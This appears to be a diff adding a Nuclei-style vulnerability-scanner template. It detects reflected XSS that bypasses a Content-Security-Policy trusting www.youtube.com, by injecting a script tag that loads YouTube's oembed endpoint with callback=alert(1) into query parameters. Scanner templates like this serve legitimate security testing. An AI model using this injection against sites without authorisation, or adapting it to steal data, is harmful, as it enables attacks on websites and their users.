@@ -1,0 +1,48 @@
+id: youtube-csp-xss
+
+info:
+  name: Content-Security-Policy Bypass via Youtube
+  author: DhiyaneshDK
+  severity: high
+  reference:
+    - https://infosecwriteups.com/riding-the-waves-of-api-versioning-unmasking-a-stored-xss-vulnerability-bypassing-csp-using-c039c10df2b1
+    - https://github.com/renniepak/CSPBypass/blob/0b4c8aee52497d660adce7a6d67311a73383818c/data.tsv#L206C17-L206C89
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,youtube
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - '<script src="https://www.youtube.com/oembed?callback=alert(1)"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{injection}}"
+
+      - type: word
+        part: content_type
+        words:
+          - "text/html"
+
+      - type: word
+        part: content_security_policy
+        words:
+          - "www.youtube.com"
+          - "script-src"
+        condition: and
